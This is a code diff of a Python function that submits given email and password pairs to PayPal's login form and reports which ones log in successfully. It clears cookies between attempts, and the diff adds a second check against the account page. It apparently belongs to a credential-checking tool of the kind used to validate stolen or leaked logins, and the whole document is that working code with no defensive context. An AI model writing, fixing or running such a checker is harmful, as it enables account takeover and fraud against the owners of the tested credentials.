@@ -104,13 +104,17 @@ def paypal(user, password):
     if ismail(user):
         b.clear_cookies()
         form = b.get_forms("https://www.paypal.com/ar/cgi-bin/webscr"
-            "?cmd=_login-run", cache=1000)[1]
+            "?cmd=_login-run", cache=0*1000)[1]
         form["login_email"] = user
         form["login_password"] = password
         try:
             code, title = form.submit()
             if code == 200:
-                if 's.prop1="xpt/Customer/general/RedirectingPP"' in b.get_html():
+                if ('cgi-bin/webscr?cmd=_login-done' in b.get_html()):
+                    return "paypal.com"
+                elif ('cgi-bin/webscr?cmd=_logout' in b.get_html(
+                    "https://www.paypal.com/ar/cgi-bin/webscr?"
+                    "cmd=_account&nav=0")):
                     return "paypal.com"
                 else:
                     return False
